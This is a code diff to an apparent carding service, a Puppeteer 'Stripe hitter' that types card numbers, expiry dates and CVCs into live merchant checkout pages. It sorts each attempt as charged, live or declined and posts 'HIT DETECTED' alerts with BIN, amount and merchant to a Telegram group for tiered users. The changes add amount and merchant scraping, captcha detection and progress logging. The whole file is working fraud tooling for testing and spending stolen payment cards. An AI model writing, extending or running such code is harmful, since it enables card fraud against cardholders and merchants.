@@ -381,13 +381,22 @@ async function notifyHitInGroup(user, gatewayName, card, result) {
 
   const parsed = parseCreditCard(card);
   const binInfo = await lookupBin(parsed.number.slice(0, 6));
-  const binStr = `${binInfo.brand} ${binInfo.type} | ${binInfo.country_code} | ${binInfo.bank}`;
+  const binStr = `${binInfo.brand} ${binInfo.type} | ${binInfo.country_code}`;
   
+  const cache = result.session_cache || {};
+  const amount = cache.amount || "??";
+  const currency = (cache.currency || "usd").toLowerCase();
+  const symbol = CURRENCY_SYMBOLS[currency] || currency.toUpperCase() + " ";
+  const merchant = cache.merchant || "Unknown";
+  const product = cache.product ? `[${cache.product}]` : "";
+
   const msg = `🔥 <b>HIT DETECTED</b> ⚡
 👤 <b>${user?.firstName || 'User'}</b> [${user?.tier?.toUpperCase() || 'FREE'}]
 ↔️ <b>Gateway:</b> ${gatewayName}
 ✅ <b>Response:</b> Approved - Charged | ${binStr}
-[${result.elapsed}s]
+💰 <b>Amount:</b> ${symbol}${amount}
+🏪 <b>Merchant:</b> ${merchant} ${product}
+⏱️ <b>Time:</b> ${result.elapsed}s
 <a href="https://t.me/superhitbdrobot/bd_superhits">Open HIT Checker</a>`;
 
   return sendTelegramMessage(logsGroupId, msg, true).catch(e => console.error("Notification Error:", e.message));
@@ -604,20 +613,68 @@ function generateRandomInfo() {
   return { name, email };
 }
 
+const CURRENCY_SYMBOLS = {
+  'usd': '$', 'eur': '€', 'gbp': '£', 'jpy': '¥', 'cny': '¥',
+  'inr': '₹', 'krw': '₩', 'thb': '฿', 'php': '₱', 'myr': 'RM',
+  'bdt': '৳', 'pkr': '₨', 'cad': 'C$', 'aud': 'A$', 'brl': 'R$'
+};
+
 async function identifyProvider(page) {
   try {
     const data = await page.evaluate(() => {
+      const url = window.location.href.toLowerCase();
       const text = document.body.innerText.toLowerCase();
       const scripts = Array.from(document.scripts).map(s => s.src.toLowerCase()).join(" ");
-      if (scripts.includes("stripe") || text.includes("stripe")) return "Stripe";
-      if (scripts.includes("paypal") || text.includes("paypal")) return "PayPal";
-      if (scripts.includes("braintree") || text.includes("braintree")) return "Braintree";
-      if (scripts.includes("adyen") || text.includes("adyen")) return "Adyen";
-      if (scripts.includes("checkout.com") || text.includes("checkout.com")) return "Checkout.com";
-      return "Unknown";
+      
+      let provider = "Unknown";
+      if (scripts.includes("stripe") || text.includes("stripe")) provider = "Stripe";
+      if (scripts.includes("paypal") || text.includes("paypal")) provider = "PayPal";
+      if (scripts.includes("braintree") || text.includes("braintree")) provider = "Braintree";
+      
+      if (url.includes("buy.stripe.com")) provider = "Stripe (Buy)";
+      if (url.includes("invoice.stripe.com")) provider = "Stripe (Invoice)";
+      
+      return provider;
     });
     return data;
   } catch (e) { return "Unknown"; }
+}
+
+async function extractMetadata(page) {
+  try {
+    const data = await page.evaluate(() => {
+      let amount = "0", currency = "usd", product = "";
+      
+      // Look for Stripe's internal JSON
+      const scripts = document.querySelectorAll('script');
+      for (const s of scripts) {
+        const c = s.textContent || "";
+        if (c.includes('"amount_due"') || c.includes('"total"')) {
+           const am = c.match(/"amount_due"\s*:\s*(\d+)/) || c.match(/"total"\s*:\s*(\d+)/);
+           const cu = c.match(/"currency"\s*:\s*"(\w+)"/);
+           if (am) amount = (parseInt(am[1]) / 100).toFixed(2);
+           if (cu) currency = cu[1];
+        }
+      }
+
+      // Look for DOM elements if JSON fails
+      if (amount === "0") {
+        const amEl = document.querySelector('[class*="Amount"], [class*="total"], .total-amount');
+        if (amEl) {
+           const match = amEl.innerText.match(/[\d,.]+/);
+           if (match) amount = match[0];
+        }
+      }
+
+      const prodEl = document.querySelector('[class*="Product"], [class*="Merchant"], .header-business-name');
+      if (prodEl) product = prodEl.innerText.trim();
+
+      const hasCaptcha = !!document.querySelector('iframe[src*="captcha"], iframe[src*="hcaptcha"], iframe[src*="recaptcha"]');
+
+      return { amount, currency, product, hasCaptcha };
+    });
+    return data;
+  } catch (e) { return { amount: "0", currency: "usd", product: "", hasCaptcha: false }; }
 }
 
 // REAL STRIPE HITTER ENGINE (BETA)
@@ -644,15 +701,21 @@ async function automatedHit(url, card) {
     await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36");
 
     console.log(`🚀 Navigating to: ${url}`);
-    await page.goto(url, { waitUntil: "domcontentloaded", timeout: 30000 }).catch(() => {});
+    await page.goto(url, { waitUntil: "domcontentloaded", timeout: 30000 }).catch(() => {
+        console.log("⚠️ Navigation timeout or error, proceeding anyway...");
+    });
     await new Promise(r => setTimeout(r, 2000));
 
     const provider = await identifyProvider(page);
     console.log(`🛡️ Detected Provider: ${provider}`);
 
+    const metadata = await extractMetadata(page);
+    if (metadata.hasCaptcha) console.log("⚠️ Captcha Detected on Page!");
+
     const info = generateRandomInfo();
 
     // 1. Fill Fields (Email, Name)
+    console.log("📝 Filling Email and Name...");
     for (const sel of HITTER_SELECTORS.email) {
       if (await page.$(sel)) {
         await page.type(sel, info.email, { delay: 50 });
@@ -667,12 +730,15 @@ async function automatedHit(url, card) {
     }
 
     // 2. Card Handling (Standalone or iFrame)
+    console.log("💳 Detecting Card Fields...");
     const cardFrame = page.frames().find(f => f.url().includes("stripe.com") && f.name().includes("private-stripe-frame"));
     const target = cardFrame || page;
+    if (cardFrame) console.log("📦 Stripe Iframe Found.");
 
     let filledCard = false;
     for (const sel of HITTER_SELECTORS.card) {
       if (await target.$(sel)) {
+        console.log(`✨ Filling Card Number (${sel})...`);
         await target.focus(sel);
         await target.type(sel, parsed.number, { delay: 30 });
         filledCard = true;
@@ -684,6 +750,7 @@ async function automatedHit(url, card) {
       // Logic for Expiry and CVC
       for (const sel of HITTER_SELECTORS.expiry) {
         if (await target.$(sel)) {
+          console.log(`📅 Filling Expiry (${sel})...`);
           await target.focus(sel);
           await target.type(sel, `${parsed.month}${parsed.year.slice(-2)}`, { delay: 30 });
           break;
@@ -691,6 +758,7 @@ async function automatedHit(url, card) {
       }
       for (const sel of HITTER_SELECTORS.cvc) {
         if (await target.$(sel)) {
+          console.log(`🔒 Filling CVC (${sel})...`);
           await target.focus(sel);
           await target.type(sel, parsed.cvv, { delay: 30 });
           break;
@@ -734,29 +802,43 @@ async function automatedHit(url, card) {
       await new Promise(r => setTimeout(r, 1000));
       const currentUrl = page.url();
       const bodyText = await page.evaluate(() => document.body.innerText);
+      const lowBody = bodyText.toLowerCase();
 
       if (currentUrl.includes("hooks.stripe.com") || (await page.$("iframe[src*='3d_secure']"))) {
+        console.log("🛡️ 3DS Authentication Detected!");
         return { status: "live", message: "3DS Authentication Required", elapsed: "Real" };
       }
 
-      const successWords = ["Confirmed", "Success", "Thank you", "Complete", "Paid"];
-      if (successWords.some(w => bodyText.includes(w))) {
-        return { status: "charged", message: "Charged Successfully", elapsed: "Real" };
+      const successWords = ["confirmed", "success", "thank you", "complete", "paid"];
+      if (successWords.some(w => lowBody.includes(w))) {
+        console.log("✅ Charge Successful!");
+        const chargedRes = { status: "charged", message: "Charged Successfully", elapsed: "Real" };
+        chargedRes.metadata = await extractMetadata(page);
+        return chargedRes;
       }
 
-      const failWords = ["declined", "fail", "error", "could not be processed", "incorrect", "invalid"];
-      if (failWords.some(w => bodyText.includes(w).toLowerCase())) {
+      const failWords = ["declined", "fail", "error", "could not be processed", "incorrect", "invalid", "expired"];
+      if (failWords.some(w => lowBody.includes(w))) {
+        console.log("❌ Charge Declined/Failed!");
         return { status: "live_declined", message: "Card Declined / Failed", elapsed: "Real" };
       }
+      
+      if (i % 5 === 0) console.log(`⏳ Still waiting... (${i}s)`);
     }
 
-    return { status: "live_declined", message: "Transaction Finished (Status Unknown)", elapsed: "Real" };
+    console.log("⚠️ Transaction timed out without clear status.");
+    const finalResult = { status: "live_declined", message: "Transaction Finished (Status Unknown)", elapsed: "Real" };
+    finalResult.metadata = await extractMetadata(page); // Final metadata check
+    return finalResult;
 
   } catch (e) {
     console.error(`💥 Hitter Error: ${e.message}`);
     return { status: "error", message: `Automation Error: ${e.message}`, elapsed: "N/A" };
   } finally {
-    if (browser) await browser.close();
+    if (browser) {
+      console.log("🧹 Closing browser...");
+      await browser.close().catch(() => {});
+    }
   }
 }
 
@@ -772,10 +854,12 @@ async function hitStripeCheckout(checkoutUrl, card, user = null) {
 
   // Enhance result with merchant info if success
   if (result.status === "charged") {
+    const meta = result.metadata || {};
     result.session_cache = {
-      merchant: extractMerchant(checkoutUrl),
-      amount: 100, // Scraper can be added here
-      currency: "usd",
+      merchant: meta.product || extractMerchant(checkoutUrl),
+      amount: meta.amount || 100,
+      currency: meta.currency || "usd",
+      product: meta.product || "",
       pk: "pk_live_auto_detected"
     };
     
